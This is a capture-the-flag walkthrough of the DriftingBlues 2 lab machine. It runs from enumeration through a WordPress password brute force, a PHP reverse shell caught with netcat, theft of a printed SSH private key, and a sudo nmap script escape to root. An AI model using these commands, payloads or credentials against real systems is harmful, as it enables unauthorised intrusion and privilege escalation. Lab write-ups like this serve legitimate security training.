nmap -sS -sV -T4 -p- 10.0.0.15

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))

Trying to go to the ftp server hosted on port 21, we need to enter username and password. FTP has an option to log in as an anonymous user, and it works here.
There is a .jpg file, maybe we will need to do some steganography.
Openiing the image we see a picture an old time singer.

root@kali ~/D/C/DRIFTINGBLUES#2# strings secret.jpg

There are no hidden strings in the photo.

root@kali ~/D/C/DRIFTINGBLUES#2# exiftool secret.jpg

The exif data held a lot of information but not helpful, but there was a name - "Otis Rush", perhaps the man in the picture. Searching the name online, Otis Rush was an american blue guitarist and song-writer who was active in the years 1956-2003.
I do not know how to this information is helpful to us, maybe "otis" is a username.

------------------------------------------------------------------------------------------------------------------------------
HTTP
------------------------------------------------------------------------------------------------------------------------------
Going to the site hosted on the webserver on port 80, there is nothing useful on the surface. The dev commants doesn't have any comments aswell, maybe there are hidden files and directories.

root@kali ~/D/C/DRIFTINGBLUES#2# dirsearch -u http://10.0.0.15

There is a blog directory that runs wordpress. The blog displays the song "Crosscut Saw", my guess it's a song written by "Otis Rush".

root@kali ~/D/C/DRIFTINGBLUES#2# dirsearch -u http://10.0.0.15/blog

There is the wp-config.php file but it doesn't seem to display any content. There is also a login page, we probebly need to find a username and brute force into the admin page.

root@kali ~/D/C/DRIFTINGBLUES#2# wpscan --url http://10.0.0.15/blog -e

We find a user - "albert", we can now brute force the login page.

root@kali ~/D/C/DRIFTINGBLUES#2# wpscan --url http://10.0.0.15/blog --passwords /usr/share/wordlists/rockyou.txt  --usernames albert 

We find the password - "scotland1"
albert:scotland1
Loggin into the admin page, we can now upload a php revese shell script and gain access to the machine.

root@kali ~/D/T/Privilege-Escalation# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.0.0.27] from (UNKNOWN) [10.0.0.15] 50572
Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux
 05:29:46 up 14:03,  1 user,  load average: 4.18, 1.54, 0.57
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
freddie  pts/1    10.0.0.27        17:39   19:49   0.16s  0.00s sshd: freddie [priv]
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data

Going to the home folder, there is a directory for the user freddie, it holds the the first flag file, we don't have permission to read the file yet. I tried finding any any files with SUID but found none usefull, I also tried to see if there are any running proccess we can expliot.
Going back to the freddie folder, there is a hidden ssh folder,

drwxr-xr-x 2 freddie freddie 4096 Dec 17  2020 .ssh

$ ls -l
-r-------- 1 freddie freddie  396 Dec 17  2020 authorized_keys
-rwxr-xr-x 1 freddie freddie 1823 Dec 17  2020 id_rsa
-r-------- 1 freddie freddie  396 Dec 17  2020 id_rsa.pub

We have permission to read the id_rsa file(SSH uses public/private key pairs, so id_rsa is your RSA private key).
id_rsa:

freddie/id_rsa:
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAv/HVquua1jRNOCeHvQbB1CPsqkc6Y2N25ZpJ84H7DonP9CGo+vO/
gwHV7q4TsCfCK67x8uYoAOydIlIU6gwF17CpXydK52FxFfteLc0h9rkUKs8nIFxbxXBv8D
IiUwhtVTEy7ZcEYEBeC40LPhBB3/70NiTRHFXP0kOWCXLUZYrSwzpq+U+45JkzkrXYZUkL
hbHOoNFzVZTUESY/sO6/MZAGGCI2SytaIerWUiDCJB5vUB7cKuV6YwmSJw9rKKCSKWnfm+
bwAXZwL9iv+yTt5OiaY/81tzBC6WbbmIbdhibjQQS6AXRxwRdv7UrA5ymfktynDl4yOwX3
zO1cz4xK+wAAA8hn0zMfZ9MzHwAAAAdzc2gtcnNhAAABAQC/8dWq65rWNE04J4e9BsHUI+
yqRzpjY3blmknzgfsOic/0Iaj687+DAdXurhOwJ8IrrvHy5igA7J0iUhTqDAXXsKlfJ0rn
YXEV+14tzSH2uRQqzycgXFvFcG/wMiJTCG1VMTLtlwRgQF4LjQs+EEHf/vQ2JNEcVc/SQ5
YJctRlitLDOmr5T7jkmTOStdhlSQuFsc6g0XNVlNQRJj+w7r8xkAYYIjZLK1oh6tZSIMIk
Hm9QHtwq5XpjCZInD2sooJIpad+b5vABdnAv2K/7JO3k6Jpj/zW3MELpZtuYht2GJuNBBL
oBdHHBF2/tSsDnKZ+S3KcOXjI7BffM7VzPjEr7AAAAAwEAAQAAAQAWggBBM7GLbsSjUhdb
tiAihTfqW8HgB7jYgbgsQtCyyrxE73GGQ/DwJtX0UBtk67ScNL6Qcia8vQJMFP342AITYd
bqnovtCAMfxcMsccKK0PcpcfMvm0TzqRSnQOm/fNx9QfCr5aqQstuUVSy9UWC4KIhwlO6k
ePeOu3grkXiQk3uz+6H3MdXnfqgEp0bFr7cPfLgFlZuoUAiHlHoOpztP19DflVwJjJSLBT
8N+ccZIuo4z8GQK3I9kHBv7Tc1AIJLDXipHfYwYe+/2x1Xpxj7oPP6gXkmxqwQh8UQ8QBY
dT0J98HWEZctSl+MY9ybplnqeLdmfUPMlWAgOs2/dxlJAAAAgQCwZxd/EZuDde0bpgmmQ7
t5SCrDMpEb9phG8bSI9jiZNkbsgXAyj+kWRDiMvyXRjO+0Ojt97/xjmqvU07LX7wS0sTMs
QyyqBik+bFk9n2yLnJHtAsHxiEoNZx/+3s610i7KsFZQUT2FQjo0QOEoobALsviwjFXI1E
OsTmk2HN82rQAAAIEA7r1pXwyT0/zPQxxGt9YryNFl2s54xeerqKzRgIq2R+jlu4dxbVH1
FMBrPGF9razLqXlHDaRtl8Bk04SNmEfxyF+qQ9JFpY8ayQ1+G5kK0TeFvRpxYXrQH6HTMz
50wlwX9WqGWQMNzmAq0f/LMYovPaBfwK5N90lsm9zhnMLiTFcAAACBAM3SVsLgyB3B5RI6
9oZcVMQlh8NgXcQeAaioFjMRynjY1XB15nZ2rSg/GDMQ9HU0u6A9T3Me3mel/EEatQTwFQ
uPU+NjV7H3xFjTT1BNTQY7/te1gIQL4TFDhK5KeodP2PsfUdkFe2qemWBgLTa0MHY9awQM
j+//Yl8MfxNraE/9AAAADmZyZWRkaWVAdm1ob3N0AQIDBA==
-----END OPENSSH PRIVATE KEY-----

We now have the ssh key for the user freddie, we can log in via ssh from our local machine with the key.

root@kali ~/D/C/DRIFTINGBLUES#2# ssh freddie@10.0.0.15 -i id_rsa
Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jan 17 17:39:06 2022 from 10.0.0.27
freddie@driftingblues:~$ 

user.txt:
flag 1/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░░░░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░░▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

---------------------------------------------------------------------------------------------------------------
ROOT
---------------------------------------------------------------------------------------------------------------
Checking the sudo permissions for the user freddie, the user can run nmap as root.
In a previous box I did nmap had permission to run as root, I could open a new bash shell using the nmap interactive mode, but it is available in versions 2.02 to 5.21.

freddie@driftingblues:~$ nmap --version
Nmap version 7.70 

We need to find another way to get root with nmap. I found a site that has options to gain a root shell using nmap, the interactive mode was one of the options, another option was to set an envioermntel function and run it using the NSA (NMAP Scripting Engine)

{
TF=$(mktemp)
echo ‘os.execute(“/bin/sh”)’ > $TF
sudo nmap –script=$TF
}

root@driftingblues:/home/freddie# whoami
root

And we are the root user.  

root.txt:
flag 2/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!
